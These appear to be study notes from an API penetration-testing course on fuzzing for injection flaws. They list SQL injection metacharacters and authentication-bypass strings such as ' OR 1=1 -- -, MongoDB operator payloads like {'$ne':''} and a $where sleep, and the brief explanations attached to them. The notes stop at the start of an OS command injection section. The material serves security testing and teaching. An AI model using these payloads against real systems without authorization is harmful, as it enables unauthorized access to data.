# Injection Attacks  

>[Testing for Injection Vulnerabilities](https://university.apisec.ai/products/api-penetration-testing/categories/2150251361/posts/2157505668)  

## Discovering Injection Vulnerabilities  

>Fuzzing APIs is the process of sending various types of input to an endpoint to provoke an unintended response.  
>The payloads used for fuzzing include symbols, numbers, system commands, SQL queries, NoSQL queries, emojis, hexadecimal, boolean statements.  

>When reviewing API documentation, if the API is expecting a certain type of input (number, string, boolean value) send:

* Very large number
* very large string
* negative number
* string (instead of a number or boolean value)
* Random characters
* Boolean values
* Meta characters  

## SQL Injection Metacharacters  

```
'
''
;%00
--
-- -
""
;
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
OR 1=1
```  

## NoSQL Injection  

```
$gt 
{"$gt":""}
{"$gt":-1}

$ne
{"$ne":""}
{"$ne":-1}

$nin
{"$nin":1}
{"$nin":[1]}

{"$where":  "sleep(1000)"}
```  

>`$gt` is a MongoDB NoSQL query operator that selects documents that are greater than the provided value.  
>The `$ne` query operator selects documents where the value is not equal to the provided value.  
>The `$nin` operator is the `not in` operator, used to select documents where the field value is not within the specified array.  
>Many of the others in the list contain symbols that are meant to cause verbose errors.  
>Other payload samples attempt to bypassing authentication or waiting 10 seconds.  

## OS Command Injection  

>Operating system command injection attacks inject a command separator and operating system commands.  

>